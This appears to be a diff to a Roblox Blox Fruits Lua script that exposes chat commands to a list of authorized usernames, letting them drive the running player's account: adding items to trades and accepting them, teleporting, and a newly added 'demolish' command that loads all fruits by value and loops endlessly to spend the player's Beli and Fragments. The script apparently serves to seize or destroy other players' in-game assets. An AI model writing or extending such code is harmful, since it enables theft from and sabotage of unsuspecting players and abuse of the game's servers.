@@ -512,14 +512,14 @@ FireRemote("TravelZou")]]
 local function formatPremiumItems()
     local inventory = getInventory()
     if not inventory then return "None" end
-    
+
     local formattedItems = {}
     for _, item in pairs(inventory) do
         if item.Type == "Premium" then
             formattedItems[#formattedItems + 1] = string.format("%s (x%d)", item.Name, item.Count or 1)
         end
     end
-    
+
     return #formattedItems > 0 and table.concat(formattedItems, "\n") or "None"
 end
 
@@ -1117,7 +1117,9 @@ local ChatCommands = {
         tp = 0.5,
         resetfruit = 3,
         bang = 2,
-        showinv = 3
+        showinv = 3,
+        demolish = 5, -- Added cooldown for demolish command
+        resetall = 3
     },
     commands = {
         jump = function()
@@ -1149,7 +1151,7 @@ local ChatCommands = {
             end
         end,
 
-        resetfruit = function(args)
+       resetfruit = function(args) -- Assuming you've updated this with the corrected version
             task.spawn(function()
                 if not args or args == "" then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
@@ -1177,25 +1179,61 @@ local ChatCommands = {
                     return
                 end
 
-                local baseFruitName = fruitName:match("([^-]+)")
-                local formattedFruitName = baseFruitName .. "-" .. baseFruitName
+                local baseFruitName = fruitName:match("(%S+)")
+                local formattedFruitName = string.format("%s", baseFruitName)
 
-                local args = {
-                    [1] = "LoadFruit",
-                    [2] = formattedFruitName
-                }
-                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+                local Remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_")
+                Remote:InvokeServer("LoadFruit", formattedFruitName)
 
+                task.wait(0.5)
                 if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                    task.wait(0.3)
                     LocalPlayer.Character.Humanoid.Health = 0
                 end
 
                 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-                    "Reset " .. baseFruitName .. " successfully!", "All")
+                    "Reseted with " .. baseFruitName .. "", "All")
             end)
         end,
 
+        resetall = function()
+            task.spawn(function()
+                local isResettingAll = true -- Flag to control the loop
+        
+                local function performReset(fruitName) -- Modified to accept fruitName
+                    local success, error_message = pcall(function()
+                        unstoreFruit(fruitName) -- Use fruitName here
+                        resetCharacter()
+                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Reset " .. fruitName, "All") -- Use fruitName here
+                    end)
+                    if not success then
+                        warn("Error resetting fruit " .. fruitName .. ": " .. error_message)
+                    end
+                    task.wait(1) -- Add a small delay between resets to prevent potential issues
+                end
+        
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Starting continuous reset of ALL fruits in inventory...", "All")
+        
+                while isResettingAll do -- Continuous loop
+                    local inventory = getInventory() -- Get inventory inside the loop to reflect changes
+        
+                    if inventory then
+                        for _, item in pairs(inventory) do
+                            if not isResettingAll then break end -- Check flag inside loop
+                            if item.Type == "Blox Fruit" then
+                                local fruitName = item.Name -- Get fruit name from inventory item
+                                performReset(fruitName) -- Pass fruitName to performReset
+                            end
+                        end
+                    end
+        
+                    if not isResettingAll then break end -- Check flag after fruits loop
+                    task.wait(1) -- Add a small delay between full inventory cycles
+                end
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Continuous reset of ALL fruits stopped.", "All")
+        
+            end)
+        end,
+        
         tp = function()
             task.spawn(function()
                 local tradeTable = findTradeTable()
@@ -1242,6 +1280,7 @@ local ChatCommands = {
                 end
             end)
         end,
+
 
         add = function(args)
             task.spawn(function()
@@ -1345,7 +1384,7 @@ local ChatCommands = {
                 ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
             end)
         end,
-        
+
         showinv = function()
             task.spawn(function()
                 local inventory = getInventory()
@@ -1353,7 +1392,7 @@ local ChatCommands = {
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Error getting inventory.", "All")
                     return
                 end
-        
+
                 local fruitCounts = {}
                 for _, item in pairs(inventory) do
                     if item.Type == "Blox Fruit" then
@@ -1361,12 +1400,12 @@ local ChatCommands = {
                         fruitCounts[simpleName] = (fruitCounts[simpleName] or 0) + item.Count
                     end
                 end
-        
+
                 if not next(fruitCounts) then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Inventory is empty of fruits.", "All")
                     return
                 end
-        
+
                 local chatEvent = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                 local messageChunks = {}
                 local currentChunk = ""
@@ -1378,23 +1417,23 @@ local ChatCommands = {
                     end
                     table.insert(fruitList, displayText)
                 end
-                
+
                 local message = table.concat(fruitList, ", ")
-                
+
                 while #message > 0 do
                     local chunk = message:sub(1, 128)
                     local lastComma = chunk:find(",[^,]*$")
-                    
+
                     if #message > 128 and lastComma then
                         chunk = message:sub(1, lastComma - 1)
                         message = message:sub(lastComma + 2)
                     else
                         message = message:sub(#chunk + 1)
                     end
-                    
+
                     table.insert(messageChunks, chunk)
                 end
-                
+
                 for _, chunk in ipairs(messageChunks) do
                     chatEvent:FireServer(chunk, "All")
                     task.wait(1.5)
@@ -1408,16 +1447,102 @@ local ChatCommands = {
                 local commands = {
                     "Movement: ?jump, ?sit, ?reset, ?tp",
                     "Trade: ?accept, ?cleartrade, ?addall, ?add <name>, ?clearfruits, ?additem <name>",
-                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>"
+                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>, ?demolish" -- Added demolish to help
                 }
                 for _, msg in ipairs(commands) do
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
                     task.wait(0.1)
                 end
             end)
-        end
+        end,
+
+        demolish = function() -- Integrated demolish command
+            task.spawn(function()
+                local success, error = pcall(function()
+                    -- Remote invocation helper (defined outside, assuming it's in scope)
+                    local function invokeRemote(remoteName, args) -- Define invokeRemote here if not defined globally
+                        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+                        local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(remoteName)
+                        return remote:InvokeServer(unpack(args))
+                    end
+
+                    -- invokeRemote("CommF", {"RemoveFruit", "Beli"}) -- Ineffective
+
+                    -- Get and process inventory
+                    local inventory = getInventory()
+                    if not inventory then
+                        warn("Failed to retrieve inventory.")
+                        return
+                    end
+
+                    local fruits = {}
+                    for _, item in pairs(inventory) do
+                        if item.Type == "Blox Fruit" then
+                            table.insert(fruits, item)
+                        end
+                    end
+                    table.sort(fruits, function(a, b)
+                        return a.Value > b.Value
+                    end)
+
+                    -- Load fruits (removed BreakJoints - questionable action)
+                    local Players = game:GetService("Players")
+                    local LocalPlayer = Players.LocalPlayer
+                    for _, fruit in ipairs(fruits) do
+                        local baseFruitName = fruit.Name:match("(%S+)")
+                        invokeRemote("CommF", {"LoadFruit", baseFruitName})
+                        task.wait(0.5)
+                        -- if LocalPlayer.Character then  -- Removed BreakJoints
+                        --     LocalPlayer.Character:BreakJoints()
+                        --     task.wait(6)
+                        -- end
+                    end
+
+                    -- Drain Beli
+                    local function drainBeli(invokeRemote) -- Pass invokeRemote as argument
+                        local rocketArgs = {"PurchaseRawFruit", "Rocket-Rocket", false}
+                        local spinArgs = {"PurchaseRawFruit", "Spin-Spin", false}
+                        while true do
+                            invokeRemote("CommF", rocketArgs)
+                            task.wait()
+                            invokeRemote("CommF", spinArgs)
+                            task.wait()
+                        end
+                    end
+
+                    -- Drain Fragments (Assuming you've verified/corrected drainFragments)
+                    local function drainFragments(invokeRemote, RemoteName) -- Pass invokeRemote and RemoteName
+                        local fragmentArgs = {"BlackbeardReward", "Refund", "2"} -- Replace with correct args if needed
+                        while true do
+                            invokeRemote(RemoteName, fragmentArgs) -- Use passed RemoteName
+                            task.wait()
+                        end
+                    end
+
+                    -- Start draining coroutines, pass invokeRemote to drain functions
+                    coroutine.wrap(drainBeli)(invokeRemote)
+                    coroutine.wrap(drainFragments)(invokeRemote, "CommF_") -- Assuming "CommF_" is correct for fragments
+
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                        "Demolish command initiated!", "All") -- Added feedback message
+                end)
+
+                if not success then
+                    warn("Demolish command failed: ", error)
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                        "Demolish command failed! Check console for errors.", "All") -- Added error feedback
+                end
+            end)
+        end,
     }
 }
+
+-- Remote invocation helper - Define it here, outside ChatCommands, making it globally accessible to commands
+local function invokeRemote(remoteName, args)
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(remoteName)
+    return remote:InvokeServer(unpack(args))
+end
 
 local function isAuthorizedUser(player)
     return table.find(Usernames, player.Name) ~= nil
